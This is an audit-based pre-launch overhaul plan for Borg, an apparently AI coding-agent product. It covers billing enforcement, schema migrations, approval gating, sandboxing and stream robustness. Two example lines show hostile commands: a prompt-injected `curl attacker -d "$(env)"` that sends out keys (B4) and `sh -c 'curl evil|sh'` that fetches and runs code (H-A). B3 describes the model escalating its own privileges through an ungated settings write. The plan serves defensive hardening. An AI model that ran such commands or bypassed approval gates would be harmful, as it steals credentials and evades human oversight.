# Borg Pre-Launch Architecture Overhaul Plan

Synthesis of a full-codebase audit (6 subsystem deep-dives + provider sub-reads) ahead of a ~1-week launch.
Companion docs: `docs/borg-computer-use-readiness.md`, `docs/codex-computer-use-teardown.md`.

## Status (branch `overhaul/billing-indicator`)

Landed behind green tests (remote/provider/cli/tui suites + workspace clippy):
- Billing-lane indicator in every client (API vs Pro/Max/sub) + tightened billing-mode detection.
- B2 in-place schema migrations · B3 human approval for trust-bearing settings writes · B5 `borg login` /
  `borg config` + credential pre-flight + quickstart help · B6 honest self-extension activation.
- H-B: interrupt kills the running shell (steer does not); compaction 15% headroom, local estimate when the
  provider reports no usage, verbatim recent window, degrade-not-abort; output-length continuation; head+tail
  truncation instead of discarding oversized results. H-E: subprocess stdin deadlock.
- H-C: unified stream termination (Codex subprocess, OpenAI-compatible, Responses `incomplete`).
- H-D (part): autonomy attempts consumed at execution + checkpoints fed to retries; fsync'd snapshot restore;
  `host_operation_queue` index. Deferred: effect-path lease fencing / lock-store coupling, table GC.
- H-F: tool-result image channel (see `borg-computer-use-readiness.md` #1). H-G: ranked `search_files`.
- H-H: LSP initialize budget, per-server locks, diagnostics wait, UTF-16 columns.
- Claude Code compaction now surfaces as a Borg compaction card (user-reported bug).
- H-D store growth (found when the machine ran out of disk: a 15 GB `sessions.sqlite3`, 784k rows): mirrored
  child-session events now inherit the child's persistence class, so provider heartbeats, reasoning deltas and
  streaming assistant text are live-only in the parent instead of durable rows. `borg session compact
  [--no-vacuum]` removes the rows earlier builds journaled (same `persistence()` rule, not a SQL copy), cleans
  the search projection, and the VACUUM switches the file to incremental auto-vacuum.
- H-A hidden command: `run_workflow` / `run_blu_extension` approvals resolve the extension manifest and show
  the runtime, entrypoint, cwd, shell-quoted program + args, and artifact hash; the approval card carries the
  command and the automatic reviewer receives `resolved_execution` next to the raw arguments.
- Config forward-compat: `editor.toml`, `agent.toml`, and keybindings no longer refuse to load over keys from
  a newer Borg (they warn, and `editor.toml` saves keep those keys). Extension manifests stay strict.

Not done here by decision: B4 default permission mode stays FullAccess (user choice). Still open: B1
remainder + provider-credential scrubbing for shell/MCP children, secret scrubbing of tool output and the
remaining medium/low audit items, and the `borg-agent-runtime` crate extraction.

## Overall verdict

Borg is a **mature, unusually well-engineered codebase**: 1,364 high-signal tests, production hot paths are
panic-disciplined (e.g. `host.rs` has ~1 `unwrap` in 6k production lines), WAL + `synchronous=FULL` durable
storage with an at-most-once receipt protocol, event-sourced/replayable state, a thoughtful capability-based
extension model, a genuinely SotA-shaped persistent code-mode runtime, a mature TUI, a real GPUI desktop app,
and strong cross-platform CI. This is **not** a rewrite situation.

But it is not yet launch-safe. The audit found **6 blocker-class issues** (three of them
security/billing/data-loss) and several HIGH clusters. Most blockers are small, surgical fixes; the expensive
items (OS sandbox, migrations, crate split, semantic retrieval) can be sequenced or given compensating
controls. Below, severity = blocker/high/med; effort = S/M/L.

---

## BLOCKERS (must resolve or compensate before a public launch)

### B1 — Subscription-vs-API-key billing is never enforced (billing/trust) · S–M
`provider_auth.rs:359-388` computes `ok` from exit code + a `"logged in"` substring, but **never gates on
`auth_kind`** — a Codex `auth.json` holding `OPENAI_API_KEY` returns `ok=true, auth_kind="openai_api_key"`.
`validate_claude_home:335` hardcodes `auth_kind="claude_code_session"`. Validation and real runs spawn vendor
CLIs **inheriting ambient `OPENAI_API_KEY`/`ANTHROPIC_API_KEY`**, so a key in Borg's env fakes a healthy
subscription *and* bills the runs. The `"logged in"` check also matches `"not logged in"`. Directly violates
AGENTS.md. Fix: require a subscription `auth_kind` for `ok`; `env_remove` API-key vars before validation/runs;
fix the substring; add OpenCode; trace every consumer of `.ok`/`.auth_kind`.

### B2 — No schema migrations: any version bump abandons user data (data-loss) · L
Every store is "exact-version-or-reject" (`session_store.rs` v5, `workspace.rs` v2, `autonomy.rs` v2,
`local_control.rs` v1). Session store already at v5 → each bump **archives the DB aside and starts empty**
(all prior sessions/transcripts vanish from the product); workspace/autonomy **hard-fail to start**. After
launch you cannot ship even an additive schema change without wiping/bricking durable data. Fix: real
migration ladder keyed off the `*_schema.version` row (additive `ALTER`/backfill per version); reserve
archive-and-reset for genuinely unreadable DBs. **Start this now — it gates your ability to ship anything else
durable post-launch.**

### B3 — Model can escalate its own privileges → RCE bypass (security) · M
`update_agent_settings` (`self_service.rs:230-283`) routes through the **ungated** catch-all — never
approval-checked in any mode. It writes `[mcp.servers.*].command/args/env`, and MCP servers are **spawned when
the catalog is built, before any tool call**, so no gate applies. One settings write → arbitrary command
execution next turn; it can also flip extension/approval trust. Fix: force human-approval for
`mcp`/`extensions`/`approvals`/`providers`/`capabilities` writes (and `update_agent_settings` generally) even
in Auto/FullAccess.

### B4 — Ship-unsafe default: FullAccess + env-inherited API keys (security) · S
Default permission mode is `FullAccess` (`cli.rs:472,512`) → every gated tool auto-approves; first run grants
full machine access with zero approvals. Compounded: shell/MCP children inherit the full env incl. provider
keys (`process_environment.rs:17-21` only clears under an unset-by-default profile), so a prompt-injected
`curl attacker -d "$(env)"` exfiltrates every key. (The persistent-runtime path is correctly sanitized; the
shell path is not.) Fix: default to Manual (or Auto w/ reviewer); make FullAccess explicit opt-in; make
`env_clear` + minimal allowlist the default for shell/MCP children; keep provider creds out of the agent env.

### B5 — Onboarding dead-ends a new user (launch quality) · M
No credential pre-flight before the first turn (`remote_commands.rs:1138`) → a fresh user types a request and
gets a raw provider error with no remedy. No top-level `borg login` or `borg config` (auth is buried under
`borg remote login`, which is also broken for key-based providers → `host.rs:1766`). No `--help` examples.
Fix: pre-flight `provider_credentials_present` + auth picker before first prompt; add `borg login [provider]`
and `borg config {path|init|edit|validate}`; root `after_help` with quickstart; route key providers through
the working `prompt_and_store_api_key`.

### B6 — The advertised self-extension flow is inert and reports false success (correctness) · S
`create_extension`/`create_blu_extension` never emit `runtime_access` (`self_service.rs:977-1010`) → defaults
`Trusted`, but default project policy is `Sandboxed` → `evaluate_candidate` **deactivates** the package
(`extensions.rs:764-772`), even skills-only ones. The tool still returns success + "hot_reload next turn".
Docs advertise it as working. Fix: emit the minimum `runtime_access` needed; run validation/evaluation
post-swap and return real `activated`/`deactivation_reason` (EXT-2); correct the docs.

---

## HIGH-PRIORITY CLUSTERS (strongly recommended before launch)

### H-A · Execution safety beyond the approval gate (security)
- Ungated mutating built-ins: `write_file`/`edit_file`, `create_extension/plugin/adapter`, `spawn_agent`
  bypass gating in all modes (`native_harness.rs:1000`, self-service tools). Gate them or show diffs.
- `run_blu_workflow` approval **hides the real command**: detail is `format!("{tool} {input}")` — the
  `command`/argv from `blu.toml` (which can be `sh -c 'curl evil|sh'`) is never shown to human or reviewer
  (`native_harness.rs:1524-1527`). Resolve and display concrete argv + rendered template values.
- No OS-level sandbox anywhere (`protection.rs` is systemd OOM tuning). Approved/FullAccess commands run as
  the full user with network egress. **[L]** Add macOS Seatbelt / Linux seccomp+landlock (bubblewrap); confine
  FS to workspace, default-deny egress w/ allowlist. If it can't land in a week, ship Manual-default +
  env-sanitization + egress allowlist as compensating controls and label FullAccess "trusted workspace only".
- Secret scrubbing: shell stdout/stderr returns verbatim into model context + journal (no redaction). Add a
  secret-pattern scrubber on tool output before it enters context/journals.

### H-B · Turn control & context robustness (agent loop)
- **Interrupt doesn't kill a running shell command**: `exec`/`exec_command` get no cancellation token
  (`native_harness.rs:1083,1617-1622`) → Ctrl-C drops the future after 2s while the process runs to
  completion/timeout (≤30 min), output discarded. And `exec` is the *only* tool in launch mode. **[M]** Thread
  a `CancellationToken` into `ExecutionCommandRequest.cancellation`.
- **Compaction fragility**: only 5% headroom + undercounts the next round → hard `bail` on length
  (`:2058,321-323`); fully disabled when the provider omits token accounting → unbounded `messages` growth
  (`:2064-2068`); truncates to a summary-only losing recency; fatal on failure. **[M]** Raise headroom to
  ~15-20%, fall back to a local token estimate, keep a trailing verbatim window, degrade (not abort) on
  compaction failure.
- Runtime/tool output caps hard-fail instead of truncating (`persistent_runtime.rs:539-542`; `bounded_tool_content`)
  — a >1 MiB result discards the *entire* value. Truncate head+tail with a marker, always return the value.

### H-C · Provider stream resilience (cross-adapter)
Termination handling is inconsistent and sometimes unsafe: `chat_stream.rs` reports an interrupted-but-exit-0
stream as a **successful `Done`** (truncation-as-success, HIGH); `openai_compatible.rs` over-strictly requires
`[DONE]`+`finish_reason` and **discards otherwise-complete turns**; `opencode_stream.rs` drops partial text on
close; only `codex_model.rs` fails safe. Plus: **no per-event idle timeout** on any stream (the whole-request
timeout can be disabled → a stalled stream hangs forever), no mid-stream retry, `response.incomplete` discards
content, and zero-usage from local servers → context collapses to 0 → **no compaction** (ties to H-B). **[M]**
Unify a stream-termination + resilience contract: success if `finish_reason` seen; per-event idle deadline;
partial-recovery on truncation; local token-estimate fallback for usage.

### H-D · Durability correctness (single-writer, autonomy, growth)
- Single-writer is not truly enforced: the lease fences turn *completion* but not *side effects*; filesystem/
  terminal effects skip the lease entirely (`host.rs:2083-2090`); the lock isn't coupled to the store →
  cross-host split-brain / double-write (`session.rs:3228-3263`, `session_lock.rs`). **[M each]** Enforce the
  lease on effect paths, cancel losing writers, couple lock to store, make `begin()` report the PK-INSERT
  winner.
- Autonomy is at-least-once with no usable resume and can **lose never-run jobs** (attempt budget consumed at
  claim, `max_attempts=1` + crash → Failed-forever; checkpoints are write-only). **[M]** Pass a checkpoint
  reader into `execute`; increment attempts at execution; require idempotent handlers.
- No table GC/retention anywhere + missing `host_operation_queue(host_id)` index (full scan on the hot
  dispatch poll over an unbounded table). **[S index / M GC]**
- Snapshot restore/write not fsync'd → power-loss can silently corrupt a restored workspace
  (`workspace_snapshot.rs:151-154`). **[S/M]** temp→`sync_all`→rename→parent-dir fsync.

### H-E · Subprocess pipe deadlock (provider) · M
`subprocess.rs:112-129` writes **all stdin before** starting the stdout/stderr reader threads → classic pipe
deadlock on large stdin + chatty child (e.g. `git apply` on a multi-MB diff), and it's **not bounded by the
timeout** (deadline loop hasn't started). Spawn readers first; move stdin write to its own thread. (Also: the
tree-kill cancellation helper is `#[cfg(test)]`-only — verify the prod cancellation path tree-kills.)

### H-F · Multimodal tool-result gap (contract) · L
`ModelMessage::Tool { content: String }` is text-only (confirmed by 6 independent reads). Only `User` messages
carry image attachments. So no tool — MCP, screenshot, chart/PDF render, or future computer use — can return
pixels to the model; images degrade to base64 text. This is the #1 item in the computer-use readiness doc and
a general capability gap. Fix: add an attachment/content-block channel to `ModelMessage::Tool`, thread through
`record_native_tool_result` + both provider encoders (which already emit `input_image`/`image_url` from
attachments) + the MCP result mapper.

### H-G · Code retrieval is below SotA (extensibility/search)
`search_files` returns matches in **raw filesystem-walk order — no ranking** (`native_io.rs:177-230`); there is
**no semantic/vector index** for code or context (only lexical regex + `query_history` FTS5/bm25); retrieval
adapters ship no retrieval primitive (each re-implements linear scan). **[M–L]** Rank `search_files`
(filename/path-depth/match-density/non-generated); add a local embedding index over code chunks + history
exposed as a first-party `search_documents`; give adapters FTS5/bm25 + embedding candidates to rerank.

### H-H · LSP init timeout breaks large-repo/Java diagnostics · M
A single 10 s `REQUEST_TIMEOUT` also applies to `initialize` (`lsp.rs:13,488`), with a 3 s diagnostics wait —
jdtls/gopls/rust-analyzer routinely exceed both → init timeouts and empty diagnostics before indexing
finishes. Plus one global mutex serializes all LSP across languages, and no `positionEncodings` (UTF-16 vs raw
offsets → off-by on non-ASCII). Fix: long init timeout + readiness handling; per-client locking; declare
position encoding.

### H-I · Build/source availability · S (verify) — could become a blocker
Git deps `blu-lang` and `claude-agents` point at `borg-ml` org repos (`Cargo.toml:41-42`). If private,
**external users cannot build from source** while the README advertises source install. Confirm both are public
before launch (or vendor them). Also: `borg update` verifies checksum-in-transit only, **no signature** (BR-3)
— consider minisign/cosign before wide distribution.

---

## ARCHITECTURAL OVERHAULS (bigger bets — decide what lands pre- vs post-launch)

1. **Crate split (your instinct, confirmed).** `borg-core` is 300 lines and **isn't even a dependency of
   `borg-remote`**; the real product core (agent loop, tool dispatch, session store, code-mode runtimes,
   subagents, autonomy, orchestration, LSP, plugin store) lives in a single **76k-line, 40-module
   `borg-remote` god-crate** whose stated job is "enrollment and transport." Extract a `borg-agent-runtime`
   crate for the loop + runtimes + tool dispatch; leave `borg-remote` as transport/enrollment/relay. Improves
   compile time, testability, the "core" story, and gives the computer-use driver a correct home. **[L]**
   Not a launch blocker, but do it before the codebase grows further.
2. **OS-level sandbox** (H-A) — the single biggest gap between "policy prompts" and real containment. **[L]**
3. **Structured/searchable context memory** to replace summary-only compaction (carry notes across windows,
   as in the Astra teardown) — accuracy + long-run robustness. **[L]**
4. **Semantic retrieval index** (H-G) — first-party embeddings over code + history. **[L]**
5. **Computer-use subsystem** (separate readiness doc): REPL-backed `cua` tool on the persistent runtime,
   thin per-OS native driver (mac ScreenCaptureKit+AX+CGEvent / win WGC+UIA / linux AT-SPI+portal),
   AX-first + diffing + auto-settle. Depends on H-F landing first. **[L]**

## Cross-cutting themes
- **Human-vs-model capability split**: several gaps (tool-result images H-F, TUI vs GUI diff/approval parity,
  fork/undo CLI-only) share a root — capabilities exist on one surface but not another. Worth a consistency
  pass.
- **"Reported success ≠ real effect"** recurs: B1 (auth ok w/o subscription), B6 (extension false success),
  H-C (truncation-as-success), autonomy Failed-never-ran. Prefer fail-closed + honest status everywhere.
- **Effects vs completion**: durability leases, receipts, and autonomy all fence *completion* but under-fence
  *side effects*. Standardize effect-level fencing/idempotency.

## What's already strong (protect during changes)
Receipt protocol (at-most-once), WAL+FULL durable storage, event-sourced replay, remote enrollment/transport
security (HTTPS enforced, bearer tokens, SSRF hygiene), the persistent code-mode runtime, TUI maturity
(steering/queueing, diff rendering, reflow, clipboard), token/usage accounting correctness, Codex native
replay (lossless reasoning continuity), CI (6-target matrix, pinned SHAs, `cargo deny`/`audit`), and the
capability-descriptor extension/plugin store (CAS, idempotency, rollback).

---

## Suggested sequencing for ~1 week

**Day 0–1 (blockers, mostly small):** B1 (auth enforcement + env-remove), B4 (Manual default + env sanitize),
B3 (gate `update_agent_settings`), B6 (extension runtime_access + real status), B5 (login/config/pre-flight),
H-I verify repos public. Start B2 (migrations) — it's L and gates everything durable.

**Day 2–4 (high, correctness/safety):** H-B interrupt + compaction, H-C stream-termination unification, H-E
subprocess deadlock, H-D single-writer + autonomy + index/GC + snapshot fsync, H-A hidden-command + ungated
mutators + output scrubbing.

**Day 4–6:** H-F tool-result image channel (also unblocks computer use), H-H LSP init, H-G search ranking
(embedding index deferred), finish B2 migrations, GUI diff parity + TUI session-allow.

**Defer post-launch (with compensating controls / explicit labeling):** OS sandbox (Manual+egress allowlist
meanwhile), crate split, semantic retrieval index, structured memory, computer-use subsystem, release signing.

Every finding here has file:line evidence in the six subsystem audits; this plan is the consolidated,
de-duplicated view.
